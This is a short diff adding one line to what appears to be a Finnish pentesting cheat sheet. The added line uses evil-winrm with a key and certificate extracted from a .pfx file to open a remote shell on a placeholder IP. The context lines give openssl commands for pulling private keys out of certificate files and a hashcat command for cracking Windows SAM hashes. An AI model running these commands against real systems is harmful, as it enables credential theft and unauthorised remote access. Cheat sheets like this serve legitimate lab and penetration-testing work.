@@ -921,6 +921,7 @@ hashcat -v -m 1000 windowshash rockyou.txt	<--->	SAM hash crackaus
 SSL public/private key varastaminen tiedostosta:
 openssl pkcs12 -in filename.pfx -nocerts -nodes -out key.pem
 openssl pkcs12 -in filename.pfx -out cert.pem
+evil-winrm -S -c ./cert.pem -k ./key.pem -i 10.10.10.10
 
 evil-winrm -u user -p password -i 10.10.10.10	<--->	Evil-winrm github: remote Linux --> Windows
 
